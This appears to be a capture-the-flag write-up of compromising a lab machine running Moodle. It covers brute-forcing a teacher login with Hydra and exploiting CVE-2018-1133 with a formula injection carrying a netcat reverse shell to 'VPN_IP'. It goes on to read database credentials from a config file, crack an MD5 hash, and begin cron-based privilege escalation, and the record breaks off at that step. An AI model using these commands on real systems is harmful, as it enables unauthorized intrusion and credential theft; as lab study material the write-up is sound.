# Solution

Nmap results:
```
Apache httpd 2.4.25
```

Dirbuster showed that there was a login for teachers, `http://10.10.10.153/moodle/login/index.php`, and other things like, media, images ect. I started to go through ip/images, and found a file that wouldn't open, fired up burpsuite to check it out, intercepted it and sent to repeater. The repeater showed that a teacher uploaded a support ticket, and somehow it got into the wrong place of the site. Response:
```
Hi Servicedesk,

I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.

Could you guys figure out what the last charachter is, or just reset it?

Thanks,
Giovanni
```
This is kinda a lame way of finding the password. Now I need to figure out a possible username, then I'll need to bruteforce the last char.

Made a quick python script to append every ascii char to the end of Giovanni's password, then used Hydra to brute force the site. Hydra command:
```
hydra -l Giovanni -P python_wordlist 10.10.10.153 http-post-form "/moodle/login/index.php:username=^USER^&password=^PASS^&Login=Login:Invalid login, please try again" -V
```
Hydra found the password, 'Th4C00lTheacha#'. A little infomration about Moodle:
```
Moodle is a widely-used open-source e-Learning software with more than 127 million users allowing teachers and students to digitally manage course activities and exchange learning material, often deployed by large universities. In this post we will examine the technical intrinsics of a critical vulnerability in the previous Moodle release detected by RIPS Code Analysis (CVE-2018-1133). https://blog.ripstech.com/2018/moodle-remote-code-execution/
```
I then followed the 'Evil Teacher' guide, small overview of what I did:
```
Logged in with the user/pass

Went to 'my courses' then made a new topic

Clicked on the newly created topic and edited it, so I could add a math question

I clicked caulculated question for the type of math question

Filled all the needed params, then inserted /*{a*/`$_GET[0]`;//{x}} in the formula param and saved

Saving will take you to a new page, on this page just append this to the end of the url, &0=(data;nc -e /bin/bash VPN_IP 4444)

Click next page and enter in the same pice of code again and reload the page (make sure to have a listener up on your local pc before reloading the page)
```
As usual I want to upgrade my shell, so I went with the easiest method first, python:
```
python -c 'import pty;pty.spawn("/bin/bash");'
CTRL-Z
stty raw -echo
FG
```
I then cd'd down 2 dirs, now im in the moddle dir, inside that was a config.save which told me that the database password was 'Welkom1!', and the username was root. Logged in and found a few databses, one of them being moodle, so I looked into that one and found an index with encrypted passwords. One being the user 'Giovanniba', hash, '7a860966115182402ed06375cf0a22af'. The hash is md5, so I used john to crack it, `john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`, password is expelled.

Now to get root privs, I first used a script to enumerate the machine, lse.sh. Didn't really find much, so I just started looking around the home dir of Giovanni and found a file in tmp, it was called 'backup_courses.tar.gz', so I checked cron and didn't see anything, but I noticed that the modified date on the file was today. So I used a script that would monitor all processes: script name is pspy, its made from the Go lang. After running it I saw what I thought was happening. There was a root priv cron job updating the backup file in Giovanni's home dir










